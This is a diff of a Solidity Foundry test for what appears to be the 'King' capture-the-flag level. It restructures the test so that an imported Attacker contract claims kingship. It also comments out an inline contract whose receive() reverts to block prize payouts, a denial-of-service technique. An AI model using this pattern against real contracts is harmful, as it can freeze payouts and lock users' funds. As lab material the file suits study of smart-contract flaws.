@@ -1,64 +1,55 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-// import {Test} from "forge-std/Test.sol";
 import "../lib/forge-std/src/Test.sol";
-import "../lib/forge-std/src/console.sol";
-
-import {King} from "../src/level10.sol";
+import {King, Attacker} from "../src/level10.sol";
 
 contract KingTest is Test {
-    King king;
-    address attacker;
-    address player;
+    King public king;
+    Attacker public attack;
+    address player = makeAddr("player");
+    address attackerEOA = makeAddr("attackerEOA");
+
     uint256 constant INITIAL_PRIZE = 1 ether;
 
     function setUp() public {
-        player = address(0x123);
-        attacker = address(0x456);
+        vm.deal(player, 10 ether);
+        vm.deal(attackerEOA, 10 ether);
 
-        // Deploy the contract with initial prize money
-        vm.deal(player, 10 ether); // Give player some ETH
-        vm.deal(attacker, 10 ether); // Give attacker some ETH
-        vm.prank(player); // Act as player
+        vm.startPrank(player);
         king = new King{value: INITIAL_PRIZE}();
+        vm.stopPrank();
+
+        vm.startPrank(attackerEOA);
+        attack = new Attacker(king);
+        vm.stopPrank();
     }
 
     function test_attack() public {
-        vm.prank(attacker); // Attacker calls the function
-        (bool success, ) = address(king).call{value: 2 ether}("");
-        assertTrue(success, "Attack failed"); // Ensure attack succeeds
+        // attackerEOA makes the Attacker contract the king
+        vm.prank(attackerEOA);
+        attack.attack{value: 2 ether}(); // becomes king
 
-        // Attacker is now king
-        assertEq(king._king(), attacker, "Attacker is not king");
+        // Confirm that Attacker contract is now king
+        assertEq(king._king(), address(attack));
 
-        // Deploy a malicious contract that will block transfers
-        MaliciousContract malicious = new MaliciousContract{value: 3 ether}(
-            king
-        );
-        assertEq(
-            king._king(),
-            address(malicious),
-            "Malicious contract is not king"
-        );
-
-        // Try reclaiming kingship (should fail)
+        // Now simulate another user trying to become king
         vm.prank(player);
-        (bool reclaimSuccess, ) = address(king).call{value: 4 ether}("");
+        (bool success, ) = address(king).call{value: 3 ether}("");
         assertFalse(
-            reclaimSuccess,
-            "Player should not be able to reclaim kingship"
+            success,
+            "Player should not be able to become king anymore"
         );
     }
 }
 
-// Malicious contract that prevents receiving ETH
-contract MaliciousContract {
-    constructor(King _king) payable {
-        payable(address(_king)).transfer(msg.value); // Become king
-    }
+// // Malicious contract that prevents receiving ETH
+// contract MaliciousContract {
+//     constructor(King _king) payable {
+//         payable(address(_king)).transfer(msg.value); // Become king
+//     }
 
-    receive() external payable {
-        revert("Cannot transfer ETH"); // Block prize payments
-    }
-}
+//     receive() external payable {
+//         revert("Cannot transfer ETH"); // Block prize payments
+//     }
+// }
